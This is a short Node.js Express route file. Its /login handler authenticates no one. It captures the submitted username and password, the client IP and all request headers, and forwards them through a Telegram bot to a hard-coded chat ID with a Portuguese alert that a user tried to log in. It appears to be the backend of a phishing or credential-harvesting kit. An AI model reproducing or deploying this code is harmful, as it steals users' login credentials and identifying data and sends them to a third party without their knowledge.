const express = require("express");
const bot = require("./bot");

const routes = express.Router();

routes.post("/login", async function (req, res) {
  let data = `${JSON.stringify(req.body)}`;
  let peer = `${req.headers["x-forwarded-for"]}`;
  let headers = JSON.stringify(req.headers);

  console.log(`${data}`);

  await bot.telegram.sendMessage(
    "-1001747704625",
    `ALGUM USUÁRIO TENTOU FAZER LOGIN:\nDados: ${data}\nEndereço de IP: ${peer}\n\n\nHeaders: ${headers}`
  );

  return res
    .status(200)
    .json({ login: req.body.name, password: req.body.password });
});

module.exports = routes;
